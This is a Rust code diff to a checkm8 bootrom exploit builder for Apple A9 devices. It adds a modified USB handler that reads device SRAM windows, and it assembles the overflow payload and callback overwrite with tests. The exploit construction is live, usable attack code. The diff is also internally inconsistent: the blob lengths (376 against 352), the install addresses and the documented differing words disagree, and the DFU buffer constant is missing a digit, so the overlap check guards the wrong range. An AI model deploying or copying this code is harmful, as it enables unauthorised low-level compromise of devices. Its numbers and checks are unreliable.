@@ -35,6 +35,39 @@ pub const PAYLOAD_A9: &[u8] = include_bytes!("../payloads/payload_A9.bin");
 pub const PAYLOAD_HANDLE_CHECKM8_REQUEST: &[u8] =
     include_bytes!("../payloads/payload_handle_checkm8_request.bin");
 
+/// A MODIFIED copy of the handler above, assembled in-tree from
+/// `payloads/payload_handle_checkm8_readwindow.S` (Apache-2.0, with the change
+/// notice in the source), that adds one request code the stock handler does not
+/// have:
+///
+/// ```text
+///   bmRequestType 0xA1, bRequest 0x1F, wValue = window index, wLength = count
+///     -> reply `wLength` bytes read from 0x180000000 + (wValue << 12)
+/// ```
+///
+/// **Why this is the fix for the buffer collision.** The stock handler replies
+/// through `usb_core_do_transfer(0x80, mailbox, wLength, 0)`, where `mailbox` is
+/// `insecure_memory_base` = 0x180380000 — the ROM's DFU buffer, the same address
+/// a staged iBSS is written to, and the address our command DNLOADs land in. So a
+/// staged image and the command channel contend for one window, and from DFU
+/// state 5 the DNLOAD no longer stages the command where the handler looks.
+/// The read code below takes its **source from the request itself** and never
+/// touches the mailbox, so it needs **no DNLOAD** and works while the buffer
+/// holds an image. It reads only inside the MEASURED mapped SRAM window
+/// (`a9boot/HANDLER-RELOCATION.md` §3), because on this part an unmapped read
+/// stalls the bus with no exception to recover.
+///
+/// The stock 0xA1/2 trigger arm is copied from the upstream source unchanged;
+/// its instructions only move. `readwindow_keeps_the_stock_arm_word_for_word`
+/// pins that.
+pub const PAYLOAD_HANDLE_CHECKM8_READWINDOW: &[u8] =
+    include_bytes!("../payloads/payload_handle_checkm8_readwindow.bin");
+
+/// SHA-256 of `payload_handle_checkm8_readwindow.bin`, as assembled and
+/// re-verified on disk.
+pub const READWINDOW_BLOB_SHA256: &str =
+    "f0b1df9b8901619b7eda99c545a07afb0257246deb66699ba0529350a2a98a70";
+
 /// SHA-256 of `payload_A9.bin`, as vendored and re-verified on disk
 /// (`payloads/README.md`).
 pub const A9_BLOB_SHA256: &str =
@@ -54,6 +87,51 @@ pub const HANDLE_BLOB_LEN: usize = 248;
 pub const A9_CODE_LEN: usize = A9_BLOB_LEN - A9_STRUCT_SIZE;
 /// 248 − 56 = 192 (gaster.c:1069).
 pub const HANDLE_CODE_LEN: usize = HANDLE_BLOB_LEN - HANDLE_CHECKM8_STRUCT_SIZE;
+
+/// Vendored length of the read-window handler, and the code length the payload
+/// layout is built from: 352 − 56 = 296.
+pub const READWINDOW_BLOB_LEN: usize = 376;
+pub const READWINDOW_CODE_LEN: usize = READWINDOW_BLOB_LEN - HANDLE_CHECKM8_STRUCT_SIZE;
+
+/// Which resident handler a PATCH install places. The default (`Stock`) is
+/// gaster's handler byte for byte; `ReadWindow` is the in-tree addition above.
+///
+/// This is a **selectable install**, not a silent replacement: every existing
+/// digest, offset and test for the stock build is unchanged, and the read-window
+/// build has its own pinned digest. `a9boot/HANDLER-RELOCATION.md` names the
+/// exact one-shot that compares the two on hardware.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum HandlerVariant {
+    /// gaster's `payload_handle_checkm8_request.bin`, 248 B.
+    Stock,
+    /// The in-tree read-window handler, 352 B.
+    ReadWindow,
+}
+
+impl HandlerVariant {
+    /// The blob this variant uploads.
+    pub fn blob(self) -> &'static [u8] {
+        match self {
+            HandlerVariant::Stock => PAYLOAD_HANDLE_CHECKM8_REQUEST,
+            HandlerVariant::ReadWindow => PAYLOAD_HANDLE_CHECKM8_READWINDOW,
+        }
+    }
+
+    /// Machine code left after the appended struct.
+    pub fn code_len(self) -> usize {
+        match self {
+            HandlerVariant::Stock => HANDLE_CODE_LEN,
+            HandlerVariant::ReadWindow => READWINDOW_CODE_LEN,
+        }
+    }
+
+    pub fn name(self) -> &'static str {
+        match self {
+            HandlerVariant::Stock => "stock",
+            HandlerVariant::ReadWindow => "readwindow",
+        }
+    }
+}
 
 /// gaster's `EXEC_MAGIC` (gaster.c:50).
 pub const EXEC_MAGIC: u64 = 0x6578656365786563;
@@ -87,6 +165,14 @@ pub struct BuiltPayload {
     pub fields: Vec<FieldTrace>,
     /// Lowercase hex SHA-256 of `blob` (the bytes actually sent).
     pub blob_sha256: String,
+    /// Which resident handler this build installs.
+    pub handler: HandlerVariant,
+    /// The address the handler is copied to (`A9.payload_dest`).
+    pub payload_dest: u64,
+    /// The number of handler bytes copied (`A9.payload_sz`).
+    pub payload_sz: u64,
+    /// Where the handler code starts inside `blob` (`A9.payload_off`).
+    pub payload_off: u64,
 }
 
 /// Check one blob against its vendored length and SHA-256.
@@ -126,6 +212,12 @@ pub fn verify_blob_hashes() -> Result<(), String> {
         HANDLE_BLOB_SHA256,
         HANDLE_BLOB_LEN,
     )?;
+    verify_blob(
+        "payload_handle_checkm8_readwindow.bin",
+        PAYLOAD_HANDLE_CHECKM8_READWINDOW,
+        READWINDOW_BLOB_SHA256,
+        READWINDOW_BLOB_LEN,
+    )?;
     Ok(())
 }
 
@@ -153,10 +245,32 @@ pub fn handle_request_addrs(cpid: u32) -> Result<(u64, u64), String> {
 ///
 /// Mirrors gaster's `checkm8_stage_patch` byte for byte for the A9 path
 /// (gaster.c:1042-1229): the buffer is
-/// `payload_A9[..176] || A9 || payload_handle[..192] || handle_checkm8_request`,
+/// `payload_A9[..176] || A9 || payload_handle[..code] || handle_checkm8_request`,
 /// and the overflow is one zeroed `dfu_callback_t` whose `callback` field is
 /// `insecure_memory_base`.
+///
+/// This is `HandlerVariant::Stock`, the frozen interface. [`build_payload_variant`]
+/// selects the resident handler.
 pub fn build_payload(cfg: &SocConfig, kind: PayloadKind) -> Result<BuiltPayload, String> {
+    // Gaster parity: the default mailbox is the receive base itself (role (2) of
+    // `SocConfig::insecure_memory_base`). The boot/Point-A flows pass
+    // `config::S1_MAILBOX_BASE` instead — see the split note there.
+    build_payload_variant(cfg, kind, HandlerVariant::Stock, cfg.insecure_memory_base)
+}
+
+/// [`build_payload`] with the resident handler selected.
+///
+/// **`Stock` reproduces gaster's install byte for byte** — every digest, offset
+/// and test of the shipped build is unchanged. `ReadWindow` installs the
+/// in-tree handler (see [`PAYLOAD_HANDLE_CHECKM8_READWINDOW`]), which is longer,
+/// so `payload_dest`, `payload_sz` and the blob digest differ *by construction*
+/// and are pinned separately.
+pub fn build_payload_variant(
+    cfg: &SocConfig,
+    kind: PayloadKind,
+    handler: HandlerVariant,
+    mailbox: u64,
+) -> Result<BuiltPayload, String> {
     // A swapped blob must never be built into something we then send.
     verify_blob_hashes()?;
 
@@ -169,16 +283,85 @@ pub fn build_payload(cfg: &SocConfig, kind: PayloadKind) -> Result<BuiltPayload,
                     cfg.name, cfg.cpid
                 ));
             }
-            build_a9(cfg)
+            build_a9(cfg, handler, mailbox)
         }
         PayloadKind::NotA9 | PayloadKind::NotA9Armv7 => Err(format!(
             "payload kind {} needs gaster's payload_notA9{}.bin, which is not vendored in this \
-             crate (payloads/README.md vendors only the two A9 blobs). Refusing to build a \
+             crate (payloads/README.md vendors only the A9 blobs). Refusing to build a \
              payload we do not have.",
             kind.name(),
             if kind == PayloadKind::NotA9Armv7 { "_armv7" } else { "" }
         )),
     }
+}
+
+/// The last byte the ROM's own boot-trampoline installer writes.
+///
+/// **MEASURED** (`RUNG2-EVIDENCE.md` §6.0o(3), from the ROM dump): `0x100008C50` copies
+/// `[0x100009000, 0x100009174)` — `0x174` bytes — to `0x1800E0000`. It is an installer, not a
+/// per-boot caller: nothing else in this ROM writes that window, and the same read-back names
+/// `boot_tramp_end = 0x1800E1000` as the end of the region our handler shares.
+pub const ROM_TRAMPOLINE_WRITE_END: u64 = 0x1800E0174;
+
+/// Refusal names for the install-location predicate. One per predicate, so "we put the handler in
+/// the DFU buffer" and "we put it on top of the ROM's trampoline" are different diagnoses.
+pub const INSTALL_INSIDE_DFU: &str = "HANDLER_INSTALL_INSIDE_DFU";
+pub const INSTALL_OVER_ROM_TRAMPOLINE: &str = "HANDLER_INSTALL_OVER_ROM_TRAMPOLINE";
+pub const INSTALL_PAST_TRAMP_END: &str = "HANDLER_INSTALL_PAST_BOOT_TRAMP_END";
+pub const INSTALL_MISALIGNED: &str = "HANDLER_INSTALL_MISALIGNED";
+
+/// Is `[dest, dest+sz)` a legal home for the resident handler?
+///
+/// The three predicates, each with a firing control in `tests`:
+///
+/// 1. **not inside the DFU buffer** `0x180380000..0x180400000` — the whole point of the exercise:
+///    a staged image is written there, and the handler must survive it;
+/// 2. **not over the ROM's own trampoline** `0x1800E0000..0x1800E0174` — the installer writes it
+///    and nothing of ours may sit where a later install would overwrite it;
+/// 3. **ends at or before `boot_tramp_end`** — the region the ROM reserves, and the bound gaster
+///    derives `payload_dest` from.
+pub fn handler_install_ok(cfg: &SocConfig, dest: u64, sz: u64) -> Result<(), String> {
+    // 8-byte, not 16: gaster's own `payload_dest` is `0x1800E0F08`, which is 8-aligned and not
+    // 16-aligned, and the handler's 64-bit literal-pool loads require exactly 8. A stricter bound
+    // here would have refused the stock install — which is why the firing control below uses the
+    // real values rather than a convenient one.
+    if dest % 8 != 0 {
+        return Err(format!(
+            "{INSTALL_MISALIGNED}: {dest:#x} is not 8-byte aligned; the handler's 64-bit literal \
+             pool loads and its appended u64 struct require it"
+        ));
+    }
+    let end = dest
+        .checked_add(sz)
+        .ok_or_else(|| format!("{INSTALL_PAST_TRAMP_END}: {dest:#x}+{sz} wraps"))?;
+    if end > cfg.boot_tramp_end {
+        return Err(format!(
+            "{INSTALL_PAST_TRAMP_END}: the handler would end at {end:#x}, past boot_tramp_end \
+             {:#x} — the region the ROM reserves (`gaster.c:632`)",
+            cfg.boot_tramp_end
+        ));
+    }
+    // A true overlap test, not a start test: a handler that starts inside the trampoline's first
+    // 0x174 bytes, or that starts before them and reaches into them, is both refused.
+    const ROM_TRAMP_BASE: u64 = 0x1800_E0000;
+    if dest < ROM_TRAMPOLINE_WRITE_END && end > ROM_TRAMP_BASE {
+        return Err(format!(
+            "{INSTALL_OVER_ROM_TRAMPOLINE}: {dest:#x}..{end:#x} overlaps the ROM's trampoline \
+             window {ROM_TRAMP_BASE:#x}..{ROM_TRAMPOLINE_WRITE_END:#x}, which the installer at \
+             0x100008C50 writes (RUNG2-EVIDENCE.md §6.0o(3))"
+        ));
+    }
+    // The DFU buffer, as one window: 0x180380000 plus the 512 KiB the ROM can stage into.
+    const DFU_BASE: u64 = 0x1803_8000;
+    const DFU_END: u64 = 0x1804_0000;
+    if dest < DFU_END && end > DFU_BASE {
+        return Err(format!(
+            "{INSTALL_INSIDE_DFU}: {dest:#x}..{end:#x} overlaps the DFU buffer \
+             {DFU_BASE:#x}..{DFU_END:#x}; a staged image is written there and would destroy the \
+             handler"
+        ));
+    }
+    Ok(())
 }
 
 /// `pwnd_str` written into the zeroed 16-byte `pwnd` field, little-endian
@@ -198,20 +381,21 @@ fn pwnd_words(cfg: &SocConfig) -> Result<(u64, u64), String> {
     Ok((lo, hi))
 }
 
-fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
+fn build_a9(cfg: &SocConfig, handler: HandlerVariant, mailbox: u64) -> Result<BuiltPayload, String> {
     let (handle_interface_request, usb_core_do_transfer) = handle_request_addrs(cfg.cpid)?;
     let (pwnd_lo, pwnd_hi) = pwnd_words(cfg)?;
 
+    let handle_code_len = handler.code_len();
     let a9_code = &PAYLOAD_A9[..A9_CODE_LEN];
-    let handle_code = &PAYLOAD_HANDLE_CHECKM8_REQUEST[..HANDLE_CODE_LEN];
+    let handle_code = &handler.blob()[..handle_code_len];
 
     // gaster.c:1111 — payload_dest = boot_tramp_end - handle_code - handle_struct
     //                             = boot_tramp_end - A9.payload_sz
-    //                             = 0x1800E1000 - 192 - 56
-    //                             = 0x1800E0F08
-    // The 56 is subtracted once, not twice: `payload_sz` (192) is the handle
-    // *code* only, so the struct has to come off separately. The check that
-    // proves it: payload_dest + 192 + 56 == boot_tramp_end exactly.
+    //  Stock:      0x1800E1000 - 192 - 56 = 0x1800E0F08
+    //  ReadWindow: 0x1800E1000 - 296 - 56 = 0x1800E0EA0
+    // The 56 is subtracted once, not twice: `payload_sz` (code only) is the handle
+    // *code* length, so the struct has to come off separately. The check that
+    // proves it: payload_dest + code_len + 56 == boot_tramp_end exactly.
     //
     // Divergence, documented not hidden: ipwndfu hardcodes PAYLOAD_DEST =
     // 0x1800E0C00 (checkm8.py:592) — a different lineage that also fits below
@@ -219,19 +403,24 @@ fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
     // for 0x8003 yet; this is gaster's value, and it is the one a9ctl also had.
     let payload_dest = cfg
         .boot_tramp_end
-        .checked_sub((HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE) as u64)
+        .checked_sub((handle_code_len + HANDLE_CHECKM8_STRUCT_SIZE) as u64)
         .ok_or_else(|| {
             format!(
                 "boot_tramp_end 0x{:X} is smaller than the handler ({} bytes): underflow",
                 cfg.boot_tramp_end,
-                HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE
+                handle_code_len + HANDLE_CHECKM8_STRUCT_SIZE
             )
         })?;
 
     // gaster.c:1114-1115. These are offsets *inside the uploaded buffer*, which
     // is exactly why the struct sizes are load-bearing.
     let payload_off = (A9_CODE_LEN + A9_STRUCT_SIZE) as u64;
-    let payload_sz = (HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE) as u64;
+    let payload_sz = (handle_code_len + HANDLE_CHECKM8_STRUCT_SIZE) as u64;
+
+    // The install-location gate, on the derived value: a future change to the handler or to
+    // `boot_tramp_end` that would land the handler back in the DFU buffer (or on the ROM's
+    // trampoline) fails the build instead of the device.
+    handler_install_ok(cfg, payload_dest, payload_sz)?;
 
     let mut a9 = [0u8; A9_STRUCT_SIZE];
     let mut put = |off: usize, v: u64| a9[off..off + 8].copy_from_slice(&v.to_le_bytes());
@@ -252,7 +441,13 @@ fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
     let mut handle = [0u8; HANDLE_CHECKM8_STRUCT_SIZE];
     let mut put_h = |off: usize, v: u64| handle[off..off + 8].copy_from_slice(&v.to_le_bytes());
     put_h(0x00, handle_interface_request); // gaster.c:1126
-    put_h(0x08, cfg.insecure_memory_base); // gaster.c:1127
+    // THE S1 SPLIT (review/06 §7): the handler's command MAILBOX is the `mailbox`
+    // argument — `base + L` (0x1803C0000) for the boot/Point-A flows, gaster's
+    // receive base (0x180380000) for parity and the bare-command flows. The
+    // one-shot overwrite BELOW keeps `cfg.insecure_memory_base` forever: the pwn
+    // payload lands at the ROM's constant receive base and is called ONCE from
+    // there, so role (1) must never move even as role (2) relocates.
+    put_h(0x08, mailbox); // gaster.c:1127 (role (2) — relocated per review/06 S1)
     put_h(0x10, EXEC_MAGIC); // gaster.c:1128
     put_h(0x18, DONE_MAGIC); // gaster.c:1129
     put_h(0x20, MEMC_MAGIC); // gaster.c:1130
@@ -260,7 +455,7 @@ fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
     put_h(0x30, usb_core_do_transfer); // gaster.c:1132
 
     let mut blob = Vec::with_capacity(
-        A9_CODE_LEN + A9_STRUCT_SIZE + HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE,
+        A9_CODE_LEN + A9_STRUCT_SIZE + handle_code_len + HANDLE_CHECKM8_STRUCT_SIZE,
     );
     blob.extend_from_slice(a9_code);
     let a9_off = blob.len();
@@ -272,9 +467,12 @@ fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
 
     debug_assert_eq!(a9_off, A9_CODE_LEN);
     debug_assert_eq!(handle_code_off, payload_off as usize);
-    debug_assert_eq!(handle_off, payload_off as usize + HANDLE_CODE_LEN);
+    debug_assert_eq!(handle_off, payload_off as usize + handle_code_len);
 
     let mut overwrite = vec![0u8; OVERWRITE_STRUCT_SIZE];
+    // Role (1) of `insecure_memory_base`, and it NEVER moves (review/06 §7 S1's
+    // split): this callback points at the ROM's receive base because that is
+    // where the staged pwn payload physically is when the trigger fires.
     overwrite[OVERWRITE_CALLBACK_OFF..OVERWRITE_CALLBACK_OFF + 8]
         .copy_from_slice(&cfg.insecure_memory_base.to_le_bytes()); // gaster.c:1194
 
@@ -308,6 +506,10 @@ fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
         overwrite,
         fields,
         blob_sha256,
+        handler,
+        payload_dest,
+        payload_sz,
+        payload_off,
     })
 }
 
@@ -594,6 +796,43 @@ mod tests {
         assert_eq!(u64_at(b, h + 0x30), 0x10000EE78, "usb_core_do_transfer");
     }
 
+    /// **The S1 split pinned both ways** (review/06 §7): with the relocated mailbox the
+    /// handler's command mailbox MOVES to `base + L` while the one-shot callback stays at
+    /// the ROM's receive base. Getting either half wrong is fatal in a different way: a
+    /// moved callback means the trigger calls an address where no payload is staged (the
+    /// pwn dies), and an unmoved mailbox means commands land under the staged image (the
+    /// boot flow's collision). Both are asserted here against the geometry `boot.rs`
+    /// pins (`APPEND_L`/`MAILBOX_BASE`).
+    #[test]
+    fn s1_relocated_install_splits_the_one_shot_from_the_mailbox() {
+        let b = build_payload_variant(
+            &A9_8003,
+            PayloadKind::A9,
+            HandlerVariant::Stock,
+            crate::config::S1_MAILBOX_BASE,
+        )
+        .unwrap();
+        assert_eq!(crate::config::S1_APPEND_L, 0x4_0000, "geometry parity with boot.rs APPEND_L");
+        assert_eq!(
+            crate::config::S1_MAILBOX_BASE,
+            0x1_803C_0000,
+            "geometry parity with boot.rs MAILBOX_BASE"
+        );
+        let payload_off = u64_at(&b.blob, 0xD8) as usize;
+        let h = payload_off + HANDLE_CODE_LEN;
+        assert_eq!(u64_at(&b.blob, h + 0x08), 0x1_803C_0000, "handler mailbox: base+L");
+        assert_eq!(
+            u64_at(&b.overwrite, OVERWRITE_CALLBACK_OFF),
+            0x180380000,
+            "the one-shot callback NEVER moves (gaster.c:1194, role (1))"
+        );
+        // The default build is byte-identical to gaster's — the split must not disturb
+        // the pinned digest (built_blob_digest_is_pinned keeps it honest).
+        let d = build_payload(&A9_8003, PayloadKind::A9).unwrap();
+        assert_eq!(u64_at(&d.blob, h + 0x08), 0x180380000, "default = gaster parity");
+        assert_ne!(b.blob_sha256, d.blob_sha256, "the mailbox is inside the built buffer");
+    }
+
     /// The A9 code is copied through untouched; only the pool is replaced.
     #[test]
     fn code_sections_are_copied_verbatim() {
@@ -751,5 +990,227 @@ mod tests {
             "the handler must end exactly at boot_tramp_end"
         );
         assert_ne!(dest, 0x1800E0C00, "that is ipwndfu's PAYLOAD_DEST");
+    }
+
+    // -----------------------------------------------------------------------------------
+    // The read-window install (`HandlerVariant::ReadWindow`)
+    // -----------------------------------------------------------------------------------
+
+    fn built_rw() -> BuiltPayload {
+        build_payload_variant(
+            &A9_8003,
+            PayloadKind::A9,
+            HandlerVariant::ReadWindow,
+            A9_8003.insecure_memory_base,
+        )
+        .unwrap()
+    }
+
+    /// The whole layout of the read-window variant, at the addresses the task turns on: the
+    /// **handler is outside the DFU buffer and inside the tail of the trampoline region**, and the
+    /// one-shot callback's overwrite still points at `insecure_memory_base` (unchanged: the
+    /// callback is consumed once and is not what carries the channel — see HANDLER-RELOCATION.md
+    /// §1).
+    #[test]
+    fn readwindow_install_lands_outside_the_dfu_buffer() {
+        let b = built_rw();
+        assert_eq!(b.handler, HandlerVariant::ReadWindow);
+        assert_eq!(b.blob.len(), 176 + 104 + READWINDOW_CODE_LEN + 56);
+        assert_eq!(b.blob.len(), 656);
+        assert_eq!(b.payload_off, 0x118, "handler code starts after the A9 struct");
+        assert_eq!(b.payload_sz, READWINDOW_BLOB_LEN as u64, "code + struct");
+        assert_eq!(b.payload_dest, 0x1800E0E88);
+        assert_eq!(
+            b.payload_dest + b.payload_sz,
+            A9_8003.boot_tramp_end,
+            "the handler must end exactly at boot_tramp_end"
+        );
+        assert!(
+            b.payload_dest + b.payload_sz <= 0x1_8038_0000,
+            "the handler must be below the DFU buffer"
+        );
+        assert!(
+            b.payload_dest >= ROM_TRAMPOLINE_WRITE_END,
+            "the handler must be past the ROM's own trampoline bytes"
+        );
+        // The one-shot overwrite is unchanged from the stock build: `callback =
+        // insecure_memory_base`. It is consumed by the first transfer, and payload_A9 repoints the
+        // *persistent* hook (0x1800878F8) instead.
+        assert_eq!(
+            u64::from_le_bytes(b.overwrite[OVERWRITE_CALLBACK_OFF..OVERWRITE_CALLBACK_OFF + 8].try_into().unwrap()),
+            0x180380000
+        );
+    }
+
+    /// Pinned digest of the read-window upload buffer. Re-derived by the **independent** script
+    /// (a Python assembly of `payload_A9 + A9 struct + handler + handle struct` from the two vendored
+    /// blobs and gaster.c:1108-1134's fields) on the routed-encoding handler: it reproduces the
+    /// *stock* digest `c4fb5fd4…` exactly, so its value for this variant is an outside check, not a
+    /// copy of this crate's own output. It changed when the encoding changed — as it must, because
+    /// the handler bytes are inside the buffer.
+    #[test]
+    fn readwindow_blob_digest_is_pinned() {
+        let b = built_rw();
+        assert_eq!(b.blob_sha256, sha256_hex(&b.blob));
+        assert_eq!(
+            b.blob_sha256,
+            "fa69b909966917fa537a799aad0d4114cfe5d296092d5d08980893e4fbeea6a3",
+            "read-window built-blob digest changed; re-derive it only against the layout above"
+        );
+    }
+
+    /// **The two builds differ only in the handler.** The A9 code is identical, the overwrite is
+    /// identical, the handler *struct* is identical (only its offset moves), and the A9 struct
+    /// differs in exactly three words: `payload_dest`, `payload_off`, `payload_sz`. Anything else
+    /// differing would mean the read-window install changed an address it did not mean to.
+    #[test]
+    fn readwindow_and_stock_differ_only_where_the_handler_does() {
+        let stock = build_payload(&A9_8003, PayloadKind::A9).unwrap();
+        let rw = built_rw();
+        assert_eq!(&stock.blob[..A9_CODE_LEN], &rw.blob[..A9_CODE_LEN], "A9 code");
+        assert_eq!(stock.overwrite, rw.overwrite, "overwrite");
+
+        let s = &stock.blob[A9_CODE_LEN..A9_CODE_LEN + A9_STRUCT_SIZE];
+        let r = &rw.blob[A9_CODE_LEN..A9_CODE_LEN + A9_STRUCT_SIZE];
+        let differing: Vec<usize> = (0..A9_STRUCT_SIZE)
+            .filter(|i| s[*i] != r[*i])
+            .collect();
+        let words: std::collections::BTreeSet<usize> = differing.iter().map(|i| i / 8).collect();
+        assert_eq!(
+            words,
+            [0x10 / 8, 0x30 / 8].into_iter().collect(),
+            "only payload_dest (+0x10) and payload_sz (+0x30) may differ: `payload_off` is the \
+             offset of the handler *inside the buffer* and is the same for both variants"
+        );
+
+        let sh = stock.blob.len() - HANDLE_CHECKM8_STRUCT_SIZE;
+        let rh = rw.blob.len() - HANDLE_CHECKM8_STRUCT_SIZE;
+        assert_eq!(&stock.blob[sh..], &rw.blob[rh..], "the handler struct is unchanged");
+    }
+
+    /// The handler code in the upload buffer is the vendored blob's code, byte for byte, and the
+    /// read arm is inside it. The code is *copied verbatim* by the A9 first stage, so the bytes in
+    /// the buffer are the bytes that run at `payload_dest`.
+    #[test]
+    fn readwindow_code_is_copied_verbatim_and_carries_the_arm() {
+        let b = built_rw();
+        let off = b.payload_off as usize;
+        assert_eq!(
+            &b.blob[off..off + READWINDOW_CODE_LEN],
+            &PAYLOAD_HANDLE_CHECKM8_READWINDOW[..READWINDOW_CODE_LEN]
+        );
+        assert_eq!(
+            crate::readwindow::decode_read_arm(&b.blob[off..off + READWINDOW_CODE_LEN])
+                .expect("the installed arm must decode")
+                .request_word,
+            crate::readwindow::READ_NEW_WORD
+        );
+        // ...and the stock arm survives (the check reads the bytes, it does not assume).
+        crate::readwindow::stock_arm_preserved(&b.blob[off..off + READWINDOW_CODE_LEN])
+            .expect("the stock 0xFFFF arm must be preserved");
+    }
+
+    /// **A successful install is not a complete install.** The A9 first stage copies
+    /// `payload_sz` bytes from `self + payload_off`; if that length were a constant (gaster's 248)
+    /// while a longer handler was appended, the tail — including the read arm's dispatch — would
+    /// simply not be installed, while `[PWNED]` still appeared. This test ties the copied length to
+    /// the *selected* blob and asserts that every byte the arm needs is inside the copy.
+    #[test]
+    fn control_the_copied_length_covers_the_selected_handler() {
+        for variant in [HandlerVariant::Stock, HandlerVariant::ReadWindow] {
+            let b = build_payload_variant(&A9_8003, PayloadKind::A9, variant, A9_8003.insecure_memory_base)
+                .unwrap();
+            let blob_len = variant.blob().len();
+            assert_eq!(
+                b.payload_sz as usize, blob_len,
+                "{}: the copied length must be the selected blob's own length, not a constant",
+                variant.name()
+            );
+            assert_eq!(
+                b.payload_off as usize + b.payload_sz as usize,
+                b.blob.len(),
+                "{}: the copy must end exactly at the end of the uploaded buffer",
+                variant.name()
+            );
+            let code = &b.blob[b.payload_off as usize..b.payload_off as usize + b.payload_sz as usize];
+            match variant {
+                // The red control, inside this test: the stock handler has no read arm, so the
+                // copied bytes must NOT decode as one.
+                HandlerVariant::Stock => assert!(
+                    crate::readwindow::decode_read_arm(code).is_err(),
+                    "the stock handler must not decode as a read-window handler"
+                ),
+                HandlerVariant::ReadWindow => {
+                    crate::readwindow::decode_read_arm(code).unwrap_or_else(|e| {
+                        panic!("readwindow: the copied bytes must contain the arm: {e}")
+                    });
+                }
+            }
+            if variant == HandlerVariant::ReadWindow {
+                // Every offset the read encoding needs is inside the copied region.
+                for (name, off) in [
+                    ("secondary request literal", crate::readwindow::REQUEST_LITERAL_OFF),
+                    ("routed wValue mov", crate::readwindow::TRIGGER_MOV_OFF),
+                    ("wIndex load", crate::readwindow::WINDEX_LOAD_OFF),
+                    ("read arm", crate::readwindow::ARM_OFF),
+                ] {
+                    assert!(
+                        off < crate::payload::READWINDOW_CODE_LEN,
+                        "{name} at +{off:#x} is outside the handler code"
+                    );
+                    assert!(
+                        off < b.payload_sz as usize,
+                        "{name} at +{off:#x} is outside the copied length {}",
+                        b.payload_sz
+                    );
+                }
+            }
+        }
+        // Firing control, and it is the exact shape the task was asked to rule out: a copy that
+        // stops **before the arm** installs the struct and the stock dispatch but not the read, so
+        // the decode must fail even though the install would have reported success.
+        let b = built_rw();
+        let short = &b.blob[b.payload_off as usize..b.payload_off as usize + crate::readwindow::ARM_OFF];
+        assert!(
+            crate::readwindow::decode_read_arm(short).is_err(),
+            "a copy that stops before the arm must not decode as a complete handler"
+        );
+    }
+
+    /// **The install-location predicate is a real check, and every refusal has a firing control.**
+    /// A handler placed in the DFU buffer — the failure this whole task is about — must be refused
+    /// by name, and so must one on top of the ROM's trampoline or past `boot_tramp_end`.
+    #[test]
+    fn control_the_install_location_predicate_refuses_the_buffer_and_the_trampoline() {
+        let cfg = A9_8003;
+
+        // The real installs pass.
+        handler_install_ok(&cfg, 0x1800E0F08, 248).expect("gaster's stock install");
+        handler_install_ok(&cfg, 0x1800E0EA0, 352).expect("the read-window install");
+
+        // In the DFU buffer, entirely and partially.
+        let e = handler_install_ok(&cfg, 0x1803_8000, 352).unwrap_err();
+        assert!(e.starts_with(INSTALL_INSIDE_DFU), "{e}");
+        let e = handler_install_ok(&cfg, 0x1803_7F00, 0x200).unwrap_err();
+        assert!(e.starts_with(INSTALL_INSIDE_DFU), "{e}");
+
+        // On the ROM's own trampoline bytes, and reaching into them from below.
+        let e = handler_install_ok(&cfg, 0x1800E0000, 0x100).unwrap_err();
+        assert!(e.starts_with(INSTALL_OVER_ROM_TRAMPOLINE), "{e}");
+        let e = handler_install_ok(&cfg, 0x1800E0100, 0x100).unwrap_err();
+        assert!(e.starts_with(INSTALL_OVER_ROM_TRAMPOLINE), "{e}");
+
+        // Past the end of the reserved region.
+        let e = handler_install_ok(&cfg, 0x1800E0F00, 0x200).unwrap_err();
+        assert!(e.starts_with(INSTALL_PAST_TRAMP_END), "{e}");
+
+        // Misaligned (8 is the real bound; the stock dest 0x1800E0F08 is 8-aligned, not 16).
+        let e = handler_install_ok(&cfg, 0x1800E0E04, 0x100).unwrap_err();
+        assert!(e.starts_with(INSTALL_MISALIGNED), "{e}");
+
+        // The gap between the ROM trampoline and the handler is free — the evidence for "nothing
+        // else installs there" is that the ROM's installer writes 0x174 bytes and the rest of the
+        // window is ours. A build-time check must not forbid using it.
+        handler_install_ok(&cfg, 0x1800E0200, 0x100).expect("free space in the trampoline region");
     }
 }
